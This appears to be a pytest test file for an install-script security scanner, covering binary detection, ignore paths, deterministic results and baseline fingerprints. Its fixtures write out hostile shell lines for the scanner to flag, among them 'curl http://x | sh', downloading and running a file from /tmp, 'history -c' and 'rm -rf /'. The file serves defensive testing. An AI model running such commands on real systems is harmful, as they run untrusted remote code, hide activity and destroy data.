"""Tests: scanner infrastructure — binary detection, ignore paths,
determinism, and the baseline fingerprint v2."""
import json

import pytest

from cex_installguard.baseline import apply, load, save
from cex_installguard.models import ScanResult
from cex_installguard.scanner import (candidates, scan_path, scan_text,
                                      looks_binary)
from cex_installguard.scoring import assess


def _result(tmp_path, text, name='x.sh'):
    p = tmp_path / name
    p.write_text(text)
    return assess(scan_path(p))


# -- binary detection -------------------------------------------------------- #

def test_binary_file_skipped_not_errored(tmp_path):
    p = tmp_path / 'evil.sh'
    p.write_bytes(b'#!/bin/sh\ncurl http://x | sh\n\x00\x01binary\x00')
    r = scan_path(p)
    assert r.files == 0
    assert not any('error' in e.lower() for e in r.errors)
    assert str(p) in ' '.join(r.metadata['skipped_binary'])


def test_utf16_detected_as_binary(tmp_path):
    p = tmp_path / 'wide.sh'
    p.write_bytes('#!/bin/sh\ncurl http://x | sh\n'.encode('utf-16'))
    r = scan_path(p)
    assert r.files == 0


def test_looks_binary_unit():
    assert not looks_binary(b'echo hi\n')
    assert looks_binary(b'\x00\x00')
    assert looks_binary(b'\xff\xfe echo')


def test_executable_binary_not_crash_discovery(tmp_path):
    exe = tmp_path / 'tool'
    exe.write_bytes(b'\x7fELF\x00\x02\x01\x01' + b'\x00' * 64)
    exe.chmod(0o755)
    r = scan_path(tmp_path)
    assert r.files == 0
    assert r.metadata['skipped_binary']


# -- ignore paths ------------------------------------------------------------ #

def test_configured_ignore_paths_honored(tmp_path):
    (tmp_path / 'vendor').mkdir()
    (tmp_path / 'vendor' / 'danger.sh').write_text('curl http://x | sh\n')
    (tmp_path / 'main.sh').write_text('echo clean\n')
    found = candidates(tmp_path, True, ignore_paths=['vendor'])
    assert not any('vendor' in str(f) for f in found)

    r = scan_path(tmp_path, ignore_paths=['vendor'])
    assert r.files == 1
    assert r.findings == []


def test_ignore_glob_pattern(tmp_path):
    (tmp_path / 'build').mkdir()
    (tmp_path / 'build' / 'a.sh').write_text('echo x\n')
    (tmp_path / 'keep.sh').write_text('echo x\n')
    found = candidates(tmp_path, True, ignore_paths=['build/*'])
    assert not any('build' in str(f) for f in found)


def test_default_skips_honored(tmp_path):
    (tmp_path / '.git').mkdir()
    (tmp_path / '.git' / 'hooks.sh').write_text('echo x\n')
    (tmp_path / 'ok.sh').write_text('echo x\n')
    found = candidates(tmp_path, True)
    assert not any('.git' in str(f) for f in found)


# -- determinism ------------------------------------------------------------ #

def test_worker_count_does_not_change_results(tmp_path):
    for i in range(12):
        (tmp_path / f's{i}.sh').write_text(
            'curl http://x.invalid/a | bash\nchmod 777 /tmp/x\n')
    a = scan_path(tmp_path, workers=1)
    b = scan_path(tmp_path, workers=8)
    fa = [(f.source, f.line, f.rule_id, f.code) for f in a.findings]
    fb = [(f.source, f.line, f.rule_id, f.code) for f in b.findings]
    assert fa == fb


def test_repeated_scans_identical(tmp_path):
    p = tmp_path / 'x.sh'
    p.write_text('URL="http://x/i"\ncurl "$URL" -o /tmp/i\nchmod +x /tmp/i\n'
                 '/tmp/i\n')
    r1 = scan_path(p)
    r2 = scan_path(p)
    assert [(f.line, f.rule_id) for f in r1.findings] == \
           [(f.line, f.rule_id) for f in r2.findings]


# -- baseline fingerprints --------------------------------------------------- #

def test_baseline_v2_survives_line_edits(tmp_path):
    script = tmp_path / 'x.sh'
    script.write_text('echo one\ncurl http://x.invalid/a | bash\necho two\n')
    r = _result(tmp_path, script.read_text())
    base = tmp_path / 'base.json'
    save(r, base)
    assert json.loads(base.read_text())['format'] == \
        'cex-installguard-baseline-v2'

    # insert a comment line above the finding (line numbers shift)
    script.write_text('# new comment\necho one\n'
                      'curl http://x.invalid/a | bash\necho two\n')
    r2 = _result(tmp_path, script.read_text())
    apply(r2, load(base))
    assert not r2.active()


def test_baseline_v2_survives_whitespace_changes(tmp_path):
    script = tmp_path / 'x.sh'
    script.write_text('history -c\n')
    r = _result(tmp_path, script.read_text())
    base = tmp_path / 'base.json'
    save(r, base)

    script.write_text('history   -c   # trailing comment\n')
    r2 = _result(tmp_path, script.read_text())
    apply(r2, load(base))
    assert not r2.active()


def test_baseline_v1_still_applies(tmp_path):
    """v1 fingerprints (from v10/v11 baselines) keep working."""
    script = tmp_path / 'x.sh'
    script.write_text('history -c\n')
    r = _result(tmp_path, script.read_text())
    from cex_installguard.baseline import fingerprint_v1
    v1 = {fingerprint_v1(f) for f in r.active()}
    base = tmp_path / 'legacy.json'
    base.write_text(json.dumps({'format': 'cex-installguard-baseline',
                                'fingerprints': sorted(v1)}))
    r2 = _result(tmp_path, script.read_text())
    apply(r2, load(base))
    assert not r2.active()


def test_baseline_new_finding_still_active(tmp_path):
    script = tmp_path / 'x.sh'
    script.write_text('history -c\n')
    r = _result(tmp_path, script.read_text())
    base = tmp_path / 'base.json'
    save(r, base)

    script.write_text('history -c\nrm -rf /\n')
    r2 = _result(tmp_path, script.read_text())
    apply(r2, load(base))
    active = {f.rule_id for f in r2.active()}
    assert 'IG002' in active and 'IG041' not in active


# -- oversize ---------------------------------------------------------------- #

def test_oversize_file_skipped(tmp_path):
    p = tmp_path / 'big.sh'
    p.write_text('echo x\n' + '#' + 'y' * 20000 + '\n')
    r = scan_path(p, max_size=100)
    assert r.files == 0
    assert r.metadata['skipped_binary']
